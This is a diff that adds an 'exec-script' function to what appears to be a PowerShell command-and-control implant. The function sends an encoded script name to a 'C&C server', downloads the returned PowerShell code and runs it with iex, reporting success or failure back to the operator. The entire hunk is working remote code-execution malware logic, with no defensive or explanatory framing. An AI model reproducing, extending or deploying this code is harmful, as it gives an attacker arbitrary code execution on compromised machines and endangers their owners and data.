@@ -184,6 +184,30 @@ function get-info  {
 
 }
 
+function exec-script {
+
+        param($scriptName)
+
+        if ($scriptName ) {
+        # send name of powershell script to retrive from C&C server then execute.
+
+		$encScriptName = base64url-encode $scriptName
+
+                $getScript = $uri + "?auth=" + $enckey + "&ld=" + $encScriptName
+		$string = decide-sendRequest $getScript
+
+                if ( $string -match '404' ) { write-output = '[!] script not avaliable on your control server!' } 
+		else {
+
+			iex -command $string 
+                        if ($?) { write-output "[+] ps code executed!" } 
+			 else { write-output "[!] something went wrong! load failed!" } 
+                }
+
+        } else { write-output "[!] You need to specify the name of script! EX: load-script NameOfScript" }
+
+}
+
 function base64url-encode {
 
 	param($rawstring)
